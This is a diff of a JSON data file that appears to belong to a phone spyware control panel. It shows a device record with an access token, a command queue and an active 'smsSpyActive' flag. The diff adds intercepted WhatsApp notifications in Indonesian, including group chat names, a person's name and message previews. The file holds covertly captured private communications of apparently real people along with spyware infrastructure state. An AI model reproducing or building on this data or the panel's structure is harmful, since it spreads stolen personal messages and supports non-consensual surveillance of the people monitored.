@@ -9345,7 +9345,7 @@
     "deviceName": "HP-RRR-85A1",
     "ownerUsername": "raditcees",
     "token": "d40c7b4bef4b07ee53e2456f723de6fe",
-    "lastSeen": 1777250210808,
+    "lastSeen": 1777250226089,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T07:30:11.065Z",
@@ -9361,6 +9361,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Memeriksa pesan baru",
+        "time": "27/04 08:37",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777250226233
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎39 pesan dari 4 chat",
+        "time": "27/04 08:36",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777250212174
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎BUNDA REMPONG (31 pesan): ~ Ijha Habib🙎‍♀️🥰",
+        "content": "💟 Stiker",
+        "time": "27/04 08:36",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777250212123
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎Senam Rappocini (4 pesan): ~ Ijha Habib🙎‍♀️🥰",
